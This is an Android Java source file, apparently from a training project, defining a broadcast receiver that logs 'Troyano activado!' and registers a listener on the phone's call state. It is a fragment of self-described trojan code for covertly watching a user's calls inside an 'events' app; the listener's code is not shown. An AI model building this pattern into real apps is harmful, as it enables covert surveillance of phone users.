package es.pue.eventos.presenetationlayer.controllers.broadcastreceivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import es.pue.eventos.presenetationlayer.listeners.LlamadasListener;


public class LlamadasBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {

        Log.d("Iniciando troyano","Troyano activado!");

        TelephonyManager telefono = (TelephonyManager)
                context.getSystemService(Context.TELEPHONY_SERVICE);

        telefono.listen(
                new LlamadasListener(context),
                PhoneStateListener.LISTEN_CALL_STATE
                );

    }
}
